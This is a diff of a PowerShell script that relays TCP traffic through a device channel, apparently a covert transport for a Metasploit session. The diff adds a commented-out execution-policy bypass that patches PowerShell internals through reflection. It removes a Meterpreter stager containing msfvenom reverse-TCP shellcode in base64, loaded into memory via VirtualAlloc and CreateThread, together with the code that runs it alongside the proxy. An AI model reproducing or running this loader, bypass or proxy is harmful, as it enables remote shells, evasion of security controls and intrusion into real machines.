@@ -1,3 +1,5 @@
+# function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy
+
 if ($M -eq $null) {
 	$M = 64
 	$cs = '
@@ -81,7 +83,7 @@ $Proxy = {
 		}
 		$b = @(0, $tcb.Channel, $flag, (sa $tcb.SendSeq $tcb.Ack))
 		$b += $length
-		[System.Console]::WriteLine("Sending: " + $b)
+#		[System.Console]::WriteLine("Sending: " + $b)
 
 		for ($i=0; $i -lt $length; $i++) {
 			$b += $data[$i]
@@ -105,7 +107,6 @@ $Proxy = {
 			SendUnack = 3
 			Ack = 0
 			RecNxt = 0
-			DeviceWriteQueue = @{}
 		}
 	}
 
@@ -124,9 +125,7 @@ $Proxy = {
 	}
 
 	function ReadSocket($tcb) {
-		if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted
-		  #-and (($tcb.SendSeq - $tcb.SendUnack) -band 15) -lt 7
-			) {
+		if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted) {
 			$l = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
 			[System.Console]::WriteLine("ReadSocket got " + $l)
 
@@ -142,8 +141,8 @@ $Proxy = {
 
 	function ProcessAck($tcb, $packet) {
 		$a = ($tcb.SendUnack+1) -band 15
-		[System.Console]::WriteLine("ProcessAck: TCB SendUnack=" + $tcb.SendUnack + " SendSeq=" + $tcb.SendSeq)
-		[System.Console]::WriteLine("ProcessAck: channel " + $tcb.Channel + " " + $a + ":" + (ack $packet[3]))
+#		[System.Console]::WriteLine("ProcessAck: TCB SendUnack=" + $tcb.SendUnack + " SendSeq=" + $tcb.SendSeq)
+#		[System.Console]::WriteLine("ProcessAck: channel " + $tcb.Channel + " " + $a + ":" + (ack $packet[3]))
 		if (ack $packet[3] -eq (($tcb.SendUnack+1) -band 15)) {
 			$tcb.SendUnack = ack $packet[3]
 		}
@@ -189,15 +188,13 @@ $Proxy = {
 		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
 
 		$DeviceBuff = New-Object Byte[] ($M+1)
+		$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
 
 		[System.Console]::WriteLine("Entering proxy loop")
 		while ($true) {
-			if ($DeviceReadTask -eq $null) {
-				$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
-			}
 			if ($DeviceReadTask -ne $null -and $DeviceReadTask.IsCompleted) {
 				$l = $Device.EndRead($DeviceReadTask)
-				$DeviceReadTask = $null
+				$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
 				debugPacket "R: " $tcb $DeviceBuff
 				if ($l -ne ($M+1)) {
 					[System.Console]::WriteLine("Error reading from device, got " + $l + " bytes")
@@ -264,7 +261,6 @@ $Proxy = {
 						[System.Console]::WriteLine("Bad ACK on channel with no TCB: " + $channel)
 					}
 				}
-				$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
 				continue
 			}
 
@@ -310,80 +306,10 @@ $Proxy = {
 	}
 
 	[System.Console]::Write("Proxy thread completed")
-
+	$cmd.Kill()
 	$device.Close()
 	$socket.Close()
 	exit
 }
 
-# Uncomment this to only run the proxy, without triggering metasploit
 & $Proxy $M $f
-
-#================== Thread 2 code: the meterpreter stager ==================
-$MeterpreterStager = {
-	[System.Console]::WriteLine("Meterpreter thread started")
-	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
-	# Generated using: msfvenom -p windows/shell/reverse_tcp -f psh-reflection LHOST=127.0.0.1 LPORT=65535
-	function ogz2 {
-		Param ($x3Vs, $nkS7QSA)
-		$shlUOd4 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-
-		return $shlUOd4.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($shlUOd4.GetMethod('GetModuleHandle')).Invoke($null, @($x3Vs)))), $nkS7QSA))
-	}
-
-	function jsf8RUi4D {
-		Param (
-			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $eUj0vp6,
-			[Parameter(Position = 1)] [Type] $uXCOGO = [Void]
-		)
-
-		$uKcu45F_ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-		$uKcu45F_.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $eUj0vp6).SetImplementationFlags('Runtime, Managed')
-		$uKcu45F_.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uXCOGO, $eUj0vp6).SetImplementationFlags('Runtime, Managed')
-
-		return $uKcu45F_.CreateType()
-	}
-
-	[Byte[]]$vjavcb5X2 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVofwAAAWgCAP//ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V")
-
-	$vUUS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll VirtualAlloc), (jsf8RUi4D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vjavcb5X2.Length,0x3000, 0x40)
-	[System.Runtime.InteropServices.Marshal]::Copy($vjavcb5X2, 0, $vUUS, $vjavcb5X2.length)
-
-	$z4da = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll CreateThread), (jsf8RUi4D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vUUS,[IntPtr]::Zero,0,[IntPtr]::Zero)
-	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll WaitForSingleObject), (jsf8RUi4D @([IntPtr], [Int32]))).Invoke($z4da,0xffffffff) | Out-Null
-}
-
-#================= Launch both threads =================
-$proxyThread = [PowerShell]::Create()
-[void] $proxyThread.AddScript($Proxy)
-[void] $proxyThread.AddParameter("M", $M)
-[void] $proxyThread.AddParameter("device", $f)
-
-$meterpreterThread = [PowerShell]::Create()
-[void] $meterpreterThread.AddScript($MeterpreterStager)
-[System.IAsyncResult]$AsyncProxyJobResult = $null
-[System.IAsyncResult]$AsyncMeterpreterJobResult = $null
-
-try {
-	Write-Host "About to start proxy thread"
-	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
-
-	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
-	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
-}
-catch {
-	$ErrorMessage = $_.Exception.Message
-	Write-Host $ErrorMessage
-}
-finally {
-	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
-		$meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
-		$meterpreterThread.Dispose()
-	}
-
-	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
-		$proxyThread.EndInvoke($AsyncProxyJobResult)
-		$proxyThread.Dispose()
-		exit
-	}
-}
